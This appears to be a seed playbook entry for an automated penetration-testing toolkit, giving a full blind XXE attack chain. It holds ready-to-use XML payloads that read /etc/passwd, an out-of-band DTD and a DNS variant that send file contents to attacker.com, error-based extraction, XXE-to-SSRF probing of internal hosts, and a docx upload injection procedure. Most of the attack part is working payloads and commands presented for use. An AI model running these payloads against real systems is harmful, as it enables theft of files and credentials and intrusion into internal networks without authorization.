# [Seed] Blind XXE OOB → Exfiltrate /etc/passwd and Probe the Internal Network

## Scenario Classification
Penetration Testing / Web Exploitation

## Goal Overview
A web endpoint accepts XML request bodies (SOAP / docx upload parsing / custom API) and does not reflect content (i.e., "blind XXE"). Use external DTD + parameter entity techniques to exfiltrate target files back to the attacker's server.

## Complete Execution Chain

1. Injection points.
   - Any Content-Type containing `xml` / `soap` / file uploads of docx/xlsx/pptx (which contain XML) / SVG.
   - After injecting a test payload, observe the response: errors / delays / OOB callbacks.
2. First try a simple XXE with reflection.
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. No reflection but OOB works → use an external DTD.
   - Host evil.dtd on your own VPS.
   - Trigger the server to load it and exfiltrate.
4. OOB also fails → see whether error-based / blind boolean works.
5. After obtaining /etc/passwd, expand the attack surface:
   - Internal port scanning (XXE → SSRF).
   - Read application configuration files (database passwords / private keys).
   - Trigger SSRF against cloud metadata → see seed-006.

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Direct SYSTEM "file://" errors out | Parser disables ENTITY references | Switch to parameter entity (%) nesting | 30min |
| File contains `<` `>` `&` causing DTD parsing to blow up | XML spec forbids special characters in parameter entities | Wrap with a `php://filter` base64 layer | 40min |
| OOB server on port 80 receives a callback but the payload is not assembled correctly | DTD nesting depth is wrong | Strictly compare against the OOB template (outer + inner) | 1h |
| File is read but only half of it | XML limits entity length (XML_MAX_TOKEN_BYTES) | Read in chunks + offset | 1h |
| Internal SSRF all return connection refused | No internal services are open on the application's subnet | Try localhost / 127.0.0.1 / internal service names (K8s) | 30min |
| Java application cannot be exploited | Java's default XML parser disables SYSTEM | Try the `jar:` protocol / or switch to a SOAP endpoint that may use an older Apache Xerces version | Several hours |

## Toolchain Findings

- **XXEinjector** — automated XXE exploitation (Ruby).
- **Burp Collaborator** / **interactsh** are essential for OOB.
- **dnslog.cn / oast.online** — domestic/international DNS-only OOB.
- File upload scenario: **docx is a zip + XML**; modify word/document.xml and re-zip to inject.
- The **payloads-all-the-things** XXE chapter is the most complete cheat sheet.

## Key Code/Commands

Standard two-layer OOB DTD (with base64 file exfiltration):

**evil.dtd (hosted on attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target request body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**Attacker starts an HTTP service to receive data**:

```bash
python3 -m http.server 8000
# Receives GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF internal network scanning:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error-based reflection — make the XML parser return content in error messages:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx upload XXE** (many document-processing applications are affected):

```bash
unzip target.docx -d unpacked/
# Edit unpacked/word/document.xml and change the beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# Upload evil.docx
```

## Suggestions for This Package

- `pentest-tools/references/web-attack-cheatsheet.md` should have a complete XXE chapter (OOB / error / blind / docx upload / SVG).
- Add interactsh-client to the bootstrap manifest (if not already present).
- Routing already includes XXE, but suggest explicitly adding an "XXE OOB exfiltration" route.

## Reusable Patterns/Script Snippets

**XXE type decision tree**:

```text
Has reflection        → directly exfiltrate with SYSTEM "file://"
Error message reflects → error-based payload (two-layer nesting + deliberately trigger a parse failure)
No reflection at all   → standard two-layer OOB DTD (DNS / HTTP)
DNS works but HTTP does not → use DNS exfiltration (base32-encode and use as a subdomain)
```

**XXE protocol list (test by parser)**:

```text
file://          → read local files (most common)
http://, https:// → SSRF
ftp://           → older Java versions also support it
gopher://        → very few PHP parsers
expect://        → command execution when PHP has the expect extension installed
jar://           → Java extracts files from a remote jar
netdoc://        → older Java alternative to file://
```

**DNS exfiltration (weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log receives hostname.attacker.com -->
```

## Evolution Actions
- [ ] Add a complete XXE chapter to web-attack-cheatsheet.md
- [ ] Check interactsh-client in bootstrap-manifest
- [x] Routing already includes an XXE entry

## Environment Information
- Attacker VPS (public IP, ports 80/8000/53 open)
- Target: any web app that accepts XML input (PHP/Java/Python lxml/.NET are all affected)
- OOB: interactsh / dnslog.cn / self-hosted DNS

## Anonymization Requirements
This entry is seed data, written based on public web exploitation patterns, and does not involve real production targets. All domains/IPs are placeholders.
